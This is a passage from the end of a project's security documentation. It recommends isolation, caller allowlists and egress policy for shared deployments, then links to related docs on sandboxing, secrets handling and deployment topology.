  wall against T2/T4, not just guardrails.*
- **Exposed / shared deployment** — whole-process wrapping + caller allowlists on
  every network adapter (and on any host bridge, §7) + egress policy.

---

### See also

- [`security-sandboxing.md`](security-sandboxing.md) — the reference: full config
  keys, the in-process-vs-OS distinction, the complete honesty table.
- [`secrets.md`](secrets.md) — at-rest storage, launch-time injection, the
  egress-proxy roadmap.
- [`SECURITY.md`](../SECURITY.md) — no-secrets-in-repo rules, network-exposure
  caveats, vulnerability reporting.
- [`docs/architecture/topologies.md`](architecture/topologies.md) — native vs.
  Docker topology, where the host bridge sits.
